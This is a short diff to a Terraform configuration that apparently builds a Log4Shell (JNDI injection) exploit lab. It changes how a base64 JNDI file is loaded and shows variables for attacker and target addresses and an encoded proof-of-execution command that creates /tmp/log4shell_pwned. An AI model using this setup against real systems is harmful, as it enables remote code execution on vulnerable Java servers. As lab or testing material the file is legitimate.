@@ -7,7 +7,7 @@ locals {
     attacker_ip=var.attacker_ip
     target_ip=var.target_ip
     target_port=var.target_port
-    jndi_base64=file("${path.module}/resources/jdni.base64")
+    jndi_base64=file("./resources/jdni.base64")
     base64_log4shell_payload=base64encode(<<-EOT
     touch /tmp/log4shell_pwned
     EOT
